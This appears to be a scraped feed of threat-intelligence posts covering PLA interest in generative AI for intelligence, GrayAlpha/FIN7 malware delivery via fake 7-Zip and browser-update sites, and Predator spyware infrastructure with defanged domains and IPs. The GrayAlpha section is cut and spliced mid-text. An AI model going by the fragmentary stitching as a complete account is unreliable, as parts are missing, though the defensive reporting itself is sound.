intelligence into a comprehensive battlefield situation report automatically, reducing the workload of intelligence personnel and improving the intelligence analysis and planning capabilities of combat personnel.</td>  </tr>  <tr>    <td>March 2023</td>    <td>PLA Daily published an article on ChatGPT that predicts combatants will have strong intelligence collection capabilities and near-real-time information perception capabilities in future informatized and intelligentized wars. To this point, the article notes that ChatGPT could be used for basic work such as data analysis, decision-making support, and natural language processing, qualitatively improving commanders decision-making capabilities through mass battlefield information processing.</td>  </tr>  <tr>    <td>June 2020</td>    <td>The PLA Daily published an article on the dangers of deepfake technology that warns deepfakes could be used to interfere with intelligence work. The article warns that the intelligence agencies of competing countries could use deepfakes to interfere with rival agencies and set limits on the scope of their operations.</td>  </tr></table><p><em><strong>Table 1:</strong> Summary of PLA Daily articles that discuss the intelligence implications of generative AI (Source: PLA Daily; Insikt Group)</em></p><h3 id="academic-research">Academic Research</h3><p>PLA researchers  especially personnel affiliated with the Academy of Military Science (AMS; ) Military Science Information Research Center (MSIRC; )  have expressed optimism about the intelligence applications of generative AI but have also recognized the fallibility of this technology, raising a variety of issues associated with applying generative AI to intelligence work. In one notable study, AMS MSIRC researchers assessed the opportunities and challenges of using generative AI to support national defense S&amp;T intelligence, providing recommendations related to taking advantage of generative AIs opportunities while mitigating its challenges. PLA researchers have also analyzed efforts within the United States (US) military to apply generative AI to intelligence tasks, likely aiming to learn from the US militarys experience and adapt best practices. Researchers not affiliated with the PLA but associated with other elements of Chinas party-state system have likewise published on the intelligence implications of generative AI, reflecting sentiments expressed by PLA personnel and providing insight into debates likely occurring within Chinas party-state system.</p><h4 id="general-views-in-the-pla">General Views in the PLA</h4><p>PLA researchers have expressed interest in the intelligence applications of generative AI, with some describing it as a potentially transformative technology. For example, in August 2024, researchers affiliated with the AMS MSIRC published an article about the effects of AI on intelligence research that contends the development of technologies like machine learning, deep learning, and generative AI has created unprecedented opportunities for intelligence research. In June 2024, researchers affiliated with AMS MSIRC, the AMS National Innovation Institute of Defense Technology (), and two civilian universities published a study that details their use of Metas Llama 13B model to develop an LLM that specializes in military OSINT, arguing that LLMs can facilitate comprehensive and accurate intelligence support for military commanders and claiming that their LLM could support intelligence analysis, strategic planning, simulation training, and command decision-making. Similarly, in February 2024, researchers affiliated with AMS MSIRC published an article that suggests applying ChatGPT-like technologies to command and control systems could result in major improvements to intelligence capabilities.</p><p>Despite recognizing possible applications of generative AI for artificial intelligence, PLA researchers have also discussed challenges associated with this technology. In the aforementioned February 2024 article, AMS MSIRC researchers warn that the intelligence limits of ChatGPT-like technologies integrated into command and control systems could result in catastrophic consequences. Likewise, in the June 2024 article, AMS and civilian university personnel contend that current LLMs have serious hallucination issues and are unsuitable for direct use in OSINT. In September 2024, researchers affiliated with the PLA National University of Defense Technologys (NUDT; ) College of Information and Communications () and College of Intelligent Science () published an article about the the relationship between AI and OSINT that argues deepfakes produced with generative AI create significant challenges for efforts to exploit the massive amount of information available on the internet for intelligence purposes.</p><h4 id="national-defense-st-intelligence-example">National Defense S&amp;T Intelligence Example</h4><p><img src="https://cms.recordedfuture.com/uploads/china_ai_001_53fa5ad11d.png" alt="china-ai-001.png"><em><strong>Figure 1:</strong> Translated table of potential national defense S&amp;T intelligence generative AI applications and benefits (Source: Empowering National Defense Science and Technology Intelligence; Insikt Group)</em></p><p>In November 2023, researchers affiliated with AMS MSIRC published an article about the potential opportunities and challenges of using generative AI for national defense S&amp;T intelligence. According to the article, traditional approaches to intelligence can no longer identify potential threats and opportunities in a timely and accurate manner, a common view that has almost certainly driven the adoption of new intelligence collection, processing, and analysis technologies within the PLA and Chinas defense industry. The authors contend that generative AI is profoundly affecting the creation and application of knowledge, including national defense S&amp;T intelligence. They claim that generative AI has the potential to improve intelligence collection, evaluation, analysis, and generation (see <strong>Figure 1</strong>), detailing how generative AI could assist intelligence personnel rather than asserting that this technology could replace intelligence personnel. For example, the authors argue that generative AI could:</p><ul><li>Help intelligence personnel familiarize themselves with unfamiliar technical fields when assigned new intelligence tasks, thereby improving the depth and scope of analysts understanding of intelligence targets</li><li>Aid intelligence personnel in refining and discovering relationships within large amounts of data and assist personnel with tasks like comparison, inference, providing examples, and induction</li><li>Generate diverse scenarios and assumptions to help intelligence analysts broaden their thinking and avoid cognitive biases during intelligence analysis, as well as evaluate analysts analytical conclusions to identify potential biases</li><li>Automatically recommend relevant images and audiovisual materials, generate statistical reports, and automatically synthesize relevant materials to facilitate diversified expression of intelligence analysis content beyond traditional intelligence reports</li></ul><p>However, they also warn that generative AI could bring unprecedented uncontrollability, uncertainty, and high levels of risk to national defense S&amp;T intelligence. They identify specific challenges such as:</p><ul><li>Heightened counterintelligence risks, including the risk of technological competitors using generative AI to create fake technical documents and deepfakes to mislead national defense S&amp;T intelligence efforts</li><li>A lack of LLMs specifically designed for national defense S&amp;T intelligence</li><li>Generative AIs limited ability to deal with uncertain and biased information</li><li>Insufficient national defense S&amp;T intelligence corpora for training LLMs, including difficulties associated with using state secrets and sensitive intelligence to train LLMs</li><li>Reliability issues like data leakage, algorithmic black boxes, value bias, and unexplainability</li></ul><p>Describing generative AI as a double-edged sword, the AMS researchers suggest that the field of national defense S&amp;T intelligence should pursue measures to simultaneously take advantage of the opportunities of generative AI and mitigate its challenges. These include:</p><ul><li>Gradually introducing generative AI into national defense S&amp;T intelligence work and evaluating the effectiveness of this technology after its introduction</li><li>Working to improve relevant corpora and LLMs</li><li>Iteratively combining intelligence workflows that involve both human and generative AI inputs to ensure reliable and credible results</li><li>Developing technologies to ensure the traceability and verify the reliability of AI-generated content</li></ul><h4 id="interest-in-us-military-applications">Interest in US Military Applications</h4><p>PLA researchers have assessed how the US military is applying generative AI to intelligence tasks, likely aiming to learn from the US militarys experience in a manner resembling Chinas previous efforts to study OSINT practices and AI military applications in the US. For example, in May 2024, a researcher affiliated with the AMS War Research Institute () published an article analyzing how the US is exploring the military applications of generative AI. The author discusses organizational changes, policy guidance, experimental testing, and security measures the US has reportedly implemented; particular military applications the US has reportedly conceptualized, tested, or put into use; and challenges the US has reportedly encountered. Notably, the author claims that the Defense Innovation Unit (DIU) of the US Department of Defense (DoD) initiated a technology program in May 2023 to explore the applications of generative AI in OSINT collection and analysis. This technology reportedly facilitated automatic data mining and evaluation, and visualized the battlefield information environment for commanders. The author highlights that DIU required this technology to help analysts edit and disseminate content, comply with DIUs AI standards, and be usable within the DoDs information environment.</p><h4 id="non-pla-perspectives">Non-PLA Perspectives</h4><p>Beyond the PLA, specialists situated within other segments of Chinas party-state system have also examined the opportunities and challenges of using generative AI for intelligence work. Though these discussions do not focus on military intelligence, they can still provide insight into how the broader party-state system is likely grappling with the intelligence implications of this technology. For example, in November 2024, researchers affiliated with the Peoples Public Security University of China (PPUSC) School of State Security () published an article that highlights the risk of false information pollution  online disinformation created by generative AI  disrupting OSINT work. Moreover, in a June 2024 article that focuses on the potential effect of ChatGPT and other similar AI tools on intelligence work, researchers affiliated with the PPUSC Public Security Intelligence Research Center () argue that careless use of ChatGPT could undermine the CCPs ideological leadership of intelligence work. The researchers remind readers that ChatGPT was developed by a US company and was largely trained with an English-language corpus. They warn that ChatGPT could be affected by Western capitalist values, generate false but convincing information based on neoliberalism and ideological neutrality, erode ideological discourse and management, and facilitate the invisible penetration of ideology into intelligence work. The views expressed in this article coincide with Chinese regulators broader efforts to ensure the correct ideological alignment of generative AI models.</p><p>To read the entire analysis, as well as receive more information about the author, Zoe Haver, <a href="https://go.recordedfuture.com/hubfs/reports/ta-cn-2025-0617.pdf" target="_blank">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>Insikt Group identified new infrastructure associated with GrayAlpha, a threat actor that overlaps with the financially motivated group commonly referred to as FIN7. This newly identified infrastructure includes domains used for payload distribution and additional IP addresses believed to be tied to GrayAlpha. Insikt Group discovered a custom PowerShell loader named PowerNet, which decompresses and executes NetSupport RAT. Insikt Group identified another custom loader, referred to as MaskBat, that has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha. Overall, Insikt Group found three primary infection methods: fake browser update pages, fake 7-Zip download sites, and the traffic distribution system (TDS) TAG-124. Notably, the use of TAG-124 had not been publicly documented prior to this report. Although all three infection vectors were observed being used simultaneously, only the fake 7-Zip download pages were still active at the time of writing, with newly registered domains appearing as recently as April 2025. Further analysis of these sites led to the identification of an individual who may be involved in the GrayAlpha operation.</p><p>In the near term, defenders are advised to enforce application allow-lists to block the download of seemingly legitimate files that contain malware. Where allow-lists are not practical, comprehensive employee security training becomes essential, particularly in recognizing suspicious behaviors such as unexpected prompts for browser updates or redirects caused by malvertising. Additionally, the use of detection rules, such as the YARA rules and Malware Intelligence Hunting queries provided in this report, is critical for identifying both existing and past infections. These rules should be updated frequently and supported with broader detection techniques, including monitoring of network artifacts and using Recorded Future Network Intelligence, due to the constantly evolving nature of malware.</p><p>Looking ahead, defenders must monitor the broader cybercriminal ecosystem to anticipate and respond to emerging threats more effectively. The continued professionalization of cybercrime increases the likelihood of organizations across multiple industries being targeted. This trend is driven by the sustained profitability of cybercrime, limited international law enforcement collaboration, and the continuous evolution of security technologies, which in turn drive innovation among threat actors. While advanced persistent threat (APT) activity is often linked to state-sponsored entities, GrayAlpha illustrates that cybercriminal groups can demonstrate a similar level of persistence. Much like the ransomware-as-a-service (RaaS) model, cybercriminals are becoming increasingly specialized and collaborative, making it imperative to adopt a comprehensive and adaptive security posture. </p><h2 id="key-findings">Key Findings</h2><ul><li>Insikt Group has identified new infrastructure linked to GrayAlpha  a threat actor overlapping with the group commonly known as FIN7  including domains utilized for payload distribution and additional IP addresses believed to be part of the threat actor&#39;s infrastructure.</li><li>Insikt Group has identified a new custom PowerShell loader dubbed PowerNet that decompresses and executes NetSupport RAT.</li><li>Insikt Group identified another custom loader, referred to as MaskBat, which has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha.</li><li>Insikt Group identified three main infection vectors associated with GrayAlpha: fake browser update pages, fake 7-Zip download sites, and the TDS TAG-124 network.

The group is organized like a professional business, with compartmentalized teams handling malware development, phishing operations, money laundering, and management. FIN7 is primarily known for financially motivated <a href="https://www.fbi.gov/contact-us/field-offices/seattle/news/stories/how-cyber-crime-group-fin7-attacked-and-stole-data-from-hundreds-of-us-companies" target="_blank">campaigns</a> involving the theft of payment card data and unauthorized access to corporate networks, particularly within the retail, hospitality, and financial sectors.</p><p>In 2018, the US Department of Justice (US DOJ) <a href="https://www.justice.gov/archives/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100" target="_blank">unsealed</a> indictments against three high-ranking FIN7 members  Dmytro Fedorov, Fedir Hladyr, and Andrii Kolpakov  highlighting the groups extensive operations against businesses across 47 US states and multiple countries. Operating under the name of a sham cybersecurity firm, Combi Security, FIN7 leveraged social engineering and customized malware, including variants of Carbanak, the groups in-house developed backdoor, to compromise thousands of point-of-sale systems and exfiltrate over 15 million payment card records. The US DOJ prosecutions revealed the groups hierarchical command structure, with members fulfilling defined roles in intrusion operations, malware administration, and logistical coordination. Despite the disruption to its leadership, FIN7s underlying infrastructure and tradecraft persisted, enabling the broader criminal enterprise to <a href="https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/" target="_blank">continue</a> targeting global organizations.</p><p>FIN7 uses a range of custom and repurposed malware and tooling to support its operations. The group typically gains initial access through spearphishing emails containing malicious attachments or links hosted on compromised sites, often combined with callback phishing to increase credibility. FIN7s early operations leveraged its then-proprietary Carbanak backdoor as the primary command-and-control framework, enabling the group to manage compromised hosts and coordinate post-compromise activity. POWERTRASH  a uniquely obfuscated, PowerShell-based, in-memory loader adapted from the PowerSploit framework  has also been a consistent feature of FIN7 intrusions, used to deploy payloads such as DiceLoader and cracked Core Impact implants to support exploitation, lateral movement, and persistence. FIN7 also developed AuKill (also known as AvNeutralizer), a custom EDR evasion utility designed to disable endpoint security solutions, which was later <a href="https://www.bleepingcomputer.com/news/security/notorious-fin7-hackers-sell-edr-killer-to-other-threat-actors/" target="_blank">reported</a> to have been offered for sale by the group on criminal marketplaces. In its most recent campaigns, FIN7 has been observed deploying the Python-based Anubis backdoor, which provides full system control via in-memory execution and communicates with its command-and-control infrastructure using Base64-encoded data.</p><p>In 2023, FIN7 <a href="https://therecord.media/researchers-tie-fin7-cybercrime-family-to-clop-ransomware-microsoft" target="_blank">expanded</a> its operations to include the deployment of ransomware through affiliations with RaaS groups such as REvil and Maze, while also managing its own RaaS programs, including the now-retired Darkside and BlackMatter. More recently, FIN7 has been observed leveraging NetSupport RAT embedded within malicious MSIX application packages, delivered via fake update sites and malvertising.</p><h2 id="threat-analysis">Threat Analysis</h2><h3 id="infection-vectors">Infection Vectors</h3><p>Over the past year, Insikt Group has identified three distinct infection vectors associated with GrayAlpha, observed during overlapping timeframes, and all ultimately resulting in NetSupport RAT infections.

These domains typically begin with &quot;cdn&quot; followed by a random number and a top-level domain (TLD). The malicious payload is commonly delivered via the <span style="font-family:courier;">/download.php</span> endpoint.

            <description><![CDATA[Despite sanctions and global scrutiny, Predator spyware operations persist. Insikt Group reveals new infrastructure links in Mozambique, Africa, and Europe, highlighting ongoing threats to civil society and political targets.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>Following major public exposures by Insikt Group and others throughout the last two years, alongside US government sanctions targeting the Intellexa Consortium  the organizational structure behind the Predator mobile spyware  Insikt Group observed a significant decline in Predator-related activity. This apparent decline raised questions about whether the combination of US sanctions, public exposure, and broader international efforts to curb spyware proliferation, such as the UK and France-led Pall Mall process, had dealt a lasting blow to Intellexas operations. Yet, Predator activity has not stopped, and in recent months, Insikt Group has observed a resurgence of activity, reflecting the operators continued persistence. While much of the identified infrastructure is tied to known Predator operators in countries previously identified by Insikt Group, a new customer has also been identified in Mozambique  a country not previously publicly linked to the spyware. This aligns with the broader observation that Predator is highly active in Africa, with over half of its identified customers located on the continent. Additionally, Insikt Group has found a connection between high-tier Predator infrastructure and a Czech entity previously associated with the Intellexa Consortium.</p><p>The deployment of spyware like Predator beyond legitimate criminal or counterterrorism use poses serious threats to privacy, legal rights, and the physical safety of both direct targets and associated individuals. While most known cases of abuse have targeted civil society and political activists, individuals and organizations in regions with a record of spyware misuse should remain vigilant, regardless of sector. Given Predators expensive licensing model, its use is typically reserved for high-value, strategic targets. This makes politicians, corporate executives, and others in sensitive positions especially vulnerable due to the intelligence they may possess. The use of spyware against political opposition figures is currently under investigation in several EU countries, reflecting wider global efforts to curb the activities of mercenary spyware developers.</p><p>As outlined in Insikt Groups previous reports on Predator, defenders should follow recommended best practices. These include ensuring personal and corporate devices are kept separate, regularly updating phones, encouraging periodic device reboots (though this may not always fully eliminate Predator), using lockdown mode, and implementing a mobile device management (MDM) system. Additionally, investing in security awareness training for employees and fostering a culture of minimal data exposure are essential for reducing the risk of successful spearphishing attacks and limiting data theft in the event of a breach.</p><p>Insikt Group expects the mercenary spyware market to continue expanding, fueled by sustained demand and corporate profitability. This growth will likely be accompanied by ongoing innovation, as rising competition and strengthened IT security among targets drive the development of new products and techniques. For instance, as defenders work to eliminate entire classes of vulnerabilities, spyware operators may adapt by targeting alternatives such as cloud backups accessed via stolen credentials or by employing new deployment methods. As these tools proliferate and techniques evolve, the range of victims is likely to extend beyond civil society, influencing political discourse and sparking further legal confrontations. Recent court rulings in favor of technology companies against spyware vendors may set a precedent, encouraging more firms to actively challenge the misuse of their platforms. Insikt Group anticipates that spyware vendors will continue leveraging complex corporate structures to evade sanctions or detection, while increasingly tailoring their operations to specific regions, a trend often described as the balkanization of the ecosystem.</p><h2 id="key-findings">Key Findings</h2><ul><li>Insikt Group has identified new infrastructure associated with Predator, indicating continued operations despite public exposure, international sanctions, and policy interventions.</li><li>The newly identified infrastructure includes both victim-facing Tier 1 servers as well as high-tier components that likely link back to Predator operators in various countries.</li><li>Although much of Predators infrastructure remains consistent with previous reporting, its operators have introduced changes designed to further evade detection  a pattern Insikt Group noted in earlier reporting.</li><li>Insikt Group has detected Predator-related activity in several countries throughout the last twelve months and is the first to report a suspected Predator operator presence in Mozambique.</li><li>Insikt Group also connected components of Predators infrastructure to a Czech entity previously linked with the Intellexa Consortium by a Czech investigative outlet.</li></ul><h2 id="background">Background</h2><p>Predator is a sophisticated mercenary spyware targeting both Android and iPhone devices and has been active since at least 2019. Originally developed by Cytrox and now operated under the Intellexa alliance, Predator is engineered for flexibility and stealth, leaving minimal evidence on infected devices and making external investigations into abuse particularly challenging. Once deployed, Predator provides complete access to a devices microphone, camera, and all data  such as contacts, messages, photos, and videos  without the victims awareness. The spywares modular design, based on Python, <a href="https://blog.talosintelligence.com/mercenary-intellexa-predator/" target="_blank">allows</a> operators to introduce new features remotely, without the need to re-exploit the device.</p><p>Predator can be <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/" target="_blank">delivered</a> through both &quot;1-click&quot; and &quot;zero-click&quot; attack vectors. &quot;1-click&quot; attacks rely on social engineering messages with malicious links that require user interaction (<a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/" target="_blank">1</a>, <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/" target="_blank">2</a>, <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/" target="_blank">3</a>), while &quot;zero-click&quot; attacks, described in the &quot;<a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/" target="_blank">Predator Files</a>,&quot; involve techniques that do not require any action from the target, such as network injection or proximity-based methods. However, there have been no confirmed cases of Predator using fully remote &quot;zero-click&quot; exploits like those seen with NSO Group Pegasus, which can compromise devices through messaging apps without any user interaction (for example, <a href="https://citizenlab.ca/2021/09/forcedentry-nso-group-imessage-zero-click-exploit-captured-in-the-wild/" target="_blank">FORCEDENTRY</a> or <a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/" target="_blank">BLASTPASS</a>).</p><p>Over the past two years, Insikt Group has identified suspected Predator operators in more than a dozen countries, including in Angola, Armenia, Botswana, the Democratic Republic of the Congo, Egypt, Indonesia, Kazakhstan, Mongolia, Mozambique, Oman, the Philippines, Saudi Arabia, and Trinidad and Tobago (<a href="https://www.recordedfuture.com/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices" target="_blank">1</a>, <a href="https://www.recordedfuture.com/research/predator-spyware-infrastructure-returns-following-exposure-sanctions" target="_blank">2</a>). Notably, this is the first public report to identify Mozambique as a suspected customer. While Predator is ostensibly marketed for counterterrorism and law enforcement purposes, previous reporting has documented a clear pattern of its deployment against civil society actors, including journalists and activists, and politicians (<a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/" target="_blank">1</a>, <a href="https://insidestory.gr/article/poios-parakoloythoyse-kinito-toy-dimosiografoy-thanasi-koykaki" target="_blank">2</a>, <a href="https://www.nytimes.com/2023/03/20/world/europe/greece-spyware-hacking-meta.html" target="_blank">3</a>, <a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/" target="_blank">4</a>). These instances described in earlier reports likely represent only a small portion of the overall abuses, given the widespread use of mercenary spyware like Predator, the difficulty of detection, and limited victim support. It is important to emphasize the risk of cross-border targeting, which has been observed not only with Predator, where an operator <a href="https://www.europarl.europa.eu/doceo/document/P-9-2024-001059_EN.html" target="_blank">linked</a> to Vietnam has targeted EU officials and members of the European Parliament, but also with <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/" target="_blank">other mercenary spyware</a>, such as Pegasus.</p><p>Despite increased public reporting on Predators infrastructure and <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/" target="_blank">techniques</a>, as well as growing attention to Intellexas <a href="https://dfrlab.org/2024/04/22/markets-matter-a-glance-into-the-spyware-industry/" target="_blank">corporate structure</a>, Predator operations remain active. This persistence continues even after measures such as <a href="https://home.treasury.gov/news/press-releases/jy2581" target="_blank">US sanctions</a>, an <a href="https://www.europarl.europa.eu/news/en/press-room/20230609IPR96217/spyware-meps-call-for-full-investigations-and-safeguards-to-prevent-abuse" target="_blank">EU resolution</a>, a <a href="https://home.treasury.gov/news/press-releases/jy2155" target="_blank">US visa</a> ban on Intellexa affiliates, and the launch of the <a href="https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-the-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities" target="_blank">Pall Mall Process</a>, alongside <a href="https://techcrunch.com/2024/04/06/price-of-zero-day-exploits-rises-as-companies-harden-products-against-hackers/?guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAK6C-oJQRNB8Ap98Hh44SWmj_mn3W34kE1QqlhLYsuHtMci4nmJrwMOGMgIpGRm65bQ5SYB7CKBzb-tHfP3jskDDrMZ9eMqRXBtY8VXdobKPRoCkTdTSpBua2hCEIfSN0NuoVfH2GDnsX1RrNIJtFXIOAz7Bb7tGkwpb0ROh9qnK&guccounter=2" target="_blank">likely rising</a> exploit costs, particularly for iPhones. This likely reflects growing demand for spyware tools, especially in countries facing export restrictions, ongoing technical innovation in response to public reporting and security enhancements, and increasingly complex corporate structures designed to impede sanctions and attribution. One such example, involving a Czech entity likely linked to Predator operations, is discussed later in this report.</p><h2 id="threat-analysis">Threat Analysis</h2><h3 id="tier-1-c2-servers">Tier 1 (C2) Servers</h3><p>Insikt Group has identified new victim-facing Tier 1 (C2) infrastructure that is highly likely associated with Predator, including domains and IP addresses. Although the specific functions of these domains and IP addresses have not yet been confirmed, they are probably involved in payload delivery and the exploitation process, consistent with previous infrastructure linked to Predator. A table in <strong>Appendix B</strong> presents the domains and IP addresses observed over the past twelve months.</p><p>Previously, domains linked to Predator often impersonated specific organizations, such as frequently visited local news outlets, as Insikt Group has reported in the past (<a href="https://www.recordedfuture.com/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices" target="_blank">1</a>, <a href="https://www.recordedfuture.com/research/predator-spyware-infrastructure-returns-following-exposure-sanctions" target="_blank">2</a>). However, this pattern began to gradually shift following increased media attention and public reporting from the end of 2023 onward. More recent domains now typically consist of two or more seemingly random English words. Insikt Group has observed that some of these domains reuse particular keywords; for instance, both <em>boundbreeze[.]com</em> and <em>branchbreeze[.]com</em> share the word &quot;breeze&quot;. In a few recent cases, domains feature Portuguese-language words, which likely reflect the language of intended targets. Additionally, certain domains contain keywords that could provide clues to their targeting, such as <em>keep-badinigroups[.]com</em>, which may refer to communities or groups associated with the Badini dialect spoken in the Badinan region of Iraqi Kurdistan.</p><p>The majority of identified domains have been registered through the registrar PDR Ltd. d/b/a PublicDomainRegistry.com and typically use name servers associated with <em>orderbox-dns[.]com</em>, among others. While Predator infrastructure has historically favored certain autonomous system numbers (ASNs) such as AS62005, AS61138, and AS44066, Insikt Group has observed that more recent Predator-linked domains are being hosted on a broader range of ASNs  including AS42708, AS20473, and AS44477  which have not previously been connected to Predator activity. Notably, Insikt Group also identified at least one instance where a server tied to higher-tier Predator infrastructure was hosted with Stark Industries.</p><h4 id="suspected-infrastructure-detection-evasion-strategies">Suspected Infrastructure Detection Evasion Strategies</h4><p>In response to ongoing public exposure, the operators behind Predator have adopted various tactics to evade detection. These involve using more varied server configurations than <a href="https://citizenlab.ca/2023/10/predator-spyware-targets-us-eu-lawmakers-journalists/" target="_blank">previously</a> <a href="https://blog.sekoia.io/active-lycantrox-infrastructure-illumination/" target="_blank">reported</a>, expanding the diversity of ASNs, and introducing additional layers to their multi-tiered infrastructure, among other approaches. One notable strategy involves the use of fake websites, which generally fall into four main categories: fake 404 error pages, counterfeit login or registration pages, sites indicating that they are under construction, and websites purporting to be associated with specific entities, such as a conference (see <strong>Figures 1-4</strong>).</p><p><img src="https://cms.recordedfuture.com/uploads/Predator3_001_5a89296aef.png" alt="Predator3-001.png"><em><strong>Figures 1-4:</strong> Example websites linked to Predator (Source: Recorded Future)</em></p><h3 id="multi-tiered-infrastructure">Multi-Tiered Infrastructure</h3><p>As previously reported by Insikt Group, Predator customers continue to use a multi-tiered infrastructure network, which is likely designed to enable the targeting of specific individuals or entities (see <strong>Figure 5</strong>). This network closely resembles the high-level architecture <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/" target="_blank">outlined</a> in Amnestys October 2023 report, but it has continued to evolve since then. Earlier versions of Predators multi-tiered infrastructure, reported by Insikt Group in March 2024, featured only three layers. The addition of a fourth layer in the current design is likely intended to further obscure the identification of countries suspected of deploying Predator.</p><p><img src="https://cms.recordedfuture.com/uploads/Predator3_002_aee5db6b97.png" alt="Predator3-002.png"><em><strong>Figure 5:</strong> Multi-tiered infrastructure linked to Predator (Source: Recorded Future)</em></p><p>Leveraging Recorded Future Network Intelligence, Insikt Group has observed that Tier 1 servers consistently communicate with a dedicated Tier 2 upstream virtual private server (VPS) IP address using Transmission Control Protocol (TCP) port 10514. These upstream servers likely function as anonymization hop points, making it more difficult to associate Tier 1 servers directly with individual Predator customers. Communication over TCP port 10514 is also consistently observed between Tier 2 and Tier 3 servers. Subsequently, Tier 3 servers relay traffic to the Tier 4 layer, which appears to correspond to static, in-country ISP IP addresses suspected to be under the control of Predator customers. In every instance analyzed, both the Tier 1 servers and their corresponding upstream servers appeared to be dedicated exclusively to a single customer.</p><p>While only Tiers 1 through 4 appear directly connected to the operational infrastructure of Predator customers, Insikt Group has also been monitoring an additional layer, tracked as Tier 5, that seems to play a central, though still unclear, role in Predator-related operations. Tier 5 servers have been linked to an entity in the Czech Republic, FoxITech s.r.o., which has previously been publicly associated with Intellexa and is discussed further in the Connection to Czech Entity section.</p><h3 id="suspected-predator-usage-within-specific-countries">Suspected Predator Usage Within Specific Countries</h3><p>Since Insikt Group began reporting on Predator in March 2024, suspected operators of the spyware have been identified in over a dozen countries worldwide. While several of these operators have remained active in the past twelve months, activity appears to have ceased in some locations, likely due to public reporting, leading to an overall lower number of current Predator operators. For example, in the Democratic Republic of the Congo (DRC), operations seem to have stopped about two weeks after Insikt Group published its findings on DRC-linked activity in September 2024. Similarly, the suspected operator in Angola became inactive around the same period, only to resume activity in early 2025, based on Recorded Future Network Intelligence. Additionally, Insikt Group has uncovered evidence of Predator use in Mozambique  a country where no Predator operators had been identified before this report.</p><h4 id="mozambique">Mozambique</h4><p>Drawing on Recorded Future Network Intelligence and other artifacts, Insikt Group attributes the domains listed in <strong>Table 1</strong> with high confidence to a suspected Predator operator based in Mozambique. Additionally, several other domains, including <em>mdundobeats[.]com</em>, <em>noticiafamosos[.]com</em>, and <em>onelifestyle24[.]com</em>, as well as others from <strong>Appendix B</strong>, are likely linked to the same customer based on various technical indicators in Recorded Future sources. Notably, all IP addresses associated with these domains, except for the one hosting <em>onelifestyle24[.]com</em>, fall within the same two /24 CIDR ranges. Insikt Group further assesses, using both Recorded Future Network Intelligence and passive DNS data, that the suspected Predator operator in Mozambique became active during the first half of 2024 and still appears to be active at the time of writing.</p><table>  <tr>    <td><strong>Domain</strong></td>    <td><strong>IP Address</strong></td>    <td><strong>Notes</strong></td>  </tr>  <tr>    <td>canylane[.]com</td>    <td>169[.]239[.]128[.]42</td>    <td>N/A</td>  </tr>  <tr>    <td>flickerxxx[.]com</td>    <td>169[.]239[.]129[.]57</td>    <td>Potentially impersonates the legitimate online photo-sharing and hosting platform Flickr (flickr[.]com)</td>  </tr>  <tr>    <td>mundoautopro[.]com</td>    <td>169[.]239[.]128[.]48</td>    <td>N/A</td>  </tr>  <tr>    <td>noticiafresca[.]net</td>    <td>169[.]239[.]128[.]46</td>    <td>Likely impersonates the legitimate Mozambique-based news website of Notcias Frescas MZ (noticiasfrescasmz[.]com)</td>  </tr></table><p><em><strong>Table 1:</strong> Domains and IP addresses linked to Predator customer located in Mozambique (Source: Recorded Future)</em></p><p>Although there has been no public reporting to date linking Predator to Mozambique, earlier investigations have connected the country to other forms of surveillance. In 2021, a report, drawing on a <a href="https://citizenlab.ca/2018/09/hide-and-seek-tracking-nso-groups-pegasus-spyware-to-operations-in-45-countries/" target="_blank">2018 Citizen Lab analysis</a>, <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/" target="_blank">suggested</a> that Mozambique was likely a Pegasus operator (there were no confirmed Pegasus infections within Mozambique at that time). Additionally, a 2016 report by the Mozambican investigative outlet Verdade <a href="https://advox.globalvoices.org/2016/05/16/the-government-of-mozambique-is-spying-on-its-citizens-according-to-verdade/" target="_blank">revealed</a> that the government had acquired and was using advanced surveillance technologies to monitor citizens communications.</p><h4 id="additional-cluster-linked-to-eastern-european-country">Additional Cluster Linked to Eastern European Country</h4><p>While many of the identified domains and IP addresses can be attributed to specific suspected operators in particular countries, attribution is less straightforward in other cases. Technical indicators frequently connect multiple domains and IP addresses into distinct clusters, which Insikt Group assesses are likely controlled by the same operator.</p><p>One such cluster was notable for its brief period of activity. Recorded Future Network Intelligence indicates this cluster was active only from August to November 2024 and likely consisted of just two sets of Tier 1 to Tier 4 servers. This cluster could represent testing and development operations due to its brevity, or it could be linked to an Eastern European operator on account of its location. Currently, <em>speedbrawse[.]com</em> is the sole domain associated with this cluster. Insikt Group assesses that the abrupt halt in activity of this operator may also be linked to the <a 